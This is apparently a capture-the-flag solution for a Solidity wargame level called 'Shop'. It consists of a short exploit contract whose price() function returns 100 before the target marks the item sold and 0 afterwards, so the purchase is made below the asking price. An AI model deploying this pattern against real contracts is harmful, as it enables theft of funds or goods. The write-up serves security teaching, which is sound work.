# 21 - Shop

### Scripted Solution

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IShop {
    function isSold() external view returns (bool);

    function buy() external;
}

contract ShopExploit {
    IShop private _shopContract;

    /**
     * Constructor sets `Shop` contract and `_price`.
     */
    constructor(address shopContractAddress) {
        _shopContract = IShop(shopContractAddress);
    }

    /**
     * Will be called by `Shop` contract to get item price.
     *
     * Note that this returns a different price depending on whether the `Shop`
     * contract has updated the `isSold` variable when it is called.
     */
    function price() external view returns (uint256) {
        return _shopContract.isSold() ? 0 : 100;
    }

    /**
     * Calls `Shop` contract's `buy`.
     */
    function buy() external {
        _shopContract.buy();
    }
}
```
